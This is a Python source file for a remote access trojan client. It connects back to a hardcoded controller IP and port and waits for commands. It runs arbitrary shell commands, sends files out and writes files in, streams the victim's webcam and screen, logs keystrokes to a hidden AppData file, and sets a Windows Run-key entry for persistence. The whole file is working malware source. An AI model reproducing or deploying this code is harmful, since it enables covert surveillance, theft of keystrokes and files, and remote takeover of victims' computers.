import sys
import socket
import subprocess
import json
import os
import threading
from vidstream import CameraClient, ScreenShareClient
import platform
import shutil
import base64
from pynput.keyboard import Listener
import threading





IP = "10.0.10.8"
PORT = 7007

APP_DATA = os.getenv("APPDATA")+"\\"

global started_kl

started_kl = False

while 1:
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT))

    def persistence():
        try:
            if platform.system() == "Windows":
                appdata_path = os.environ["appdata"] + "\\Win32.pyw"
            else :
                appdata_path = "/var/sys32.pyw"
                shutil.copy(__file__, appdata_path)
                subprocess.call("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system32 /f")
                subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system32 /t REG_SZ /d "{appdata_path}"',shell=True)
                return "[+] Persistence is ON."
        except Exception:
            return "[-] Error When Activating PERSISTENCE !"



    def reliable_recv():
        json_data = ""
        while 1:
            try:
                json_data += sock.recv(1024).decode().rstrip()
                return json.loads(json_data)
            except ValueError:
                continue


    def reliable_send(data):
        json_data = json.dumps(data)
        return sock.send(json_data.encode())


    def exec_cmd(cmd):
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()


    def open_cam():
        client_cam.start_stream()


    def close_cam():
        client_cam.stop_stream()



    def download_file(file):
        try:
            d_file = open(file, "rb")
            return base64.b64encode(d_file.read())
        except FileNotFoundError:
            return b"[!] File Not Found."


    def upload_file(file, content):
        try:
            content = base64.b64decode(content)
            open(file, "wb").write(content)
        except FileNotFoundError:
            pass


    def share_screen():
        client_screen.start_stream()


    def save_ks(key):
        open(APP_DATA+"lx_21.txt", "a").write(str(key) + "\n")


    kb_listener = Listener(on_press=save_ks)


    def kl():
        started_kl = True
        kb_listener.start()


    def stop_kl():
        started_kl = False
        kb_listener.stop()


    def clear_ks():
        try:
            os.remove(APP_DATA+"lx_21.txt")
            return "[+] KeyStrokes File has Been Deleted Successfully."
        except FileNotFoundError:
            return "[!] KeyStrokes already Cleared."


    def dump_ks():
        try:
            return open(APP_DATA+"lx_21.txt", "r").read()
        except FileNotFoundError:
            return "[!] Start the KeyLogger First or The target did not press any button."



    while 1:
        try:
            data = ""
            recv_cmd = reliable_recv()
            if len(recv_cmd) == 0:
                reliable_send("[!] Please Enter a Command.")
                continue
            command = recv_cmd[0].lower()
            if command == "open_cam" and len(recv_cmd) == 2:
                CAM_PORT = recv_cmd[1]
                client_cam = CameraClient(IP, CAM_PORT)
                open_cam()
                reliable_send("[+] Camera Opened.")
                continue
            elif command == "screen_share_on" and len(recv_cmd) == 2:
                SCREEN_PORT = recv_cmd[1]
                client_screen = ScreenShareClient(IP, SCREEN_PORT)
                share_screen()
                reliable_send("[+] Screen Sahring is Started.")
                continue
            elif command == "screen_share_off" and len(recv_cmd) == 1:
                client_screen.stop_stream()
                reliable_send("[+] Screen Sharing is Closed.")
                continue
            elif command == "close_cam" and len(recv_cmd) == 1:
                close_cam()
                reliable_send("[+] Camera Closed.")
                continue
            elif command == "quit" and len(recv_cmd) == 1:
                sock.close()
                sys.exit()
            elif command == "cd":
                if len(recv_cmd) == 2:
                    try:
                        os.chdir(recv_cmd[1])
                        data = "[+] Changed To " + recv_cmd[1] + "."
                    except (FileNotFoundError, OSError):
                        data = "[-] Directory does not exist."
                elif len(recv_cmd) > 2: # 'cd x y' : error but 'cd' only is a cmd in windows == pwd in Linux 
                    data = "[!] Please Enter the directory to change."
                elif len(recv_cmd) == 1:
                    data  = exec_cmd("cd")
            elif command == "download" and len(recv_cmd) == 2:
                data = download_file(recv_cmd[1]).decode()
            elif command == "upload" and len(recv_cmd) == 3:
                upload_file(recv_cmd[1], recv_cmd[2])
                data = "[+] File Uploaded Successfully."
            elif command == "start_kl" and len(recv_cmd) == 1:
                if started_kl:
                    data = "[+] KeyLogger is already Started."
                else:
                    started_kl = True
                    global kl_thread
                    kl_thread = threading.Thread(target=kl)
                    kl_thread.start()
                    data = "[+] KeyLogger Started Successfully."
            elif command == "stop_kl" and len(recv_cmd) == 1: # Reboot the listener and the client when stopping (thread error)
                if not started_kl:
                    data = "[+] KeyLogger is already Stopped."
                else:
                    started_kl = False
                    stop_kl()
                    data = "[+] KeyLogger Stopped."
            elif (command == "dump_ks" or command == "save_ks") and len(recv_cmd) == 1:
                data = dump_ks()
            elif command == "clear_ks" and len(recv_cmd) == 1:
                data = clear_ks()
            else:       
                data = exec_cmd(recv_cmd)
        except Exception:
            data = "[!] Invalid Command."
        reliable_send(data)
        if command == "stop_kl" : 
            break    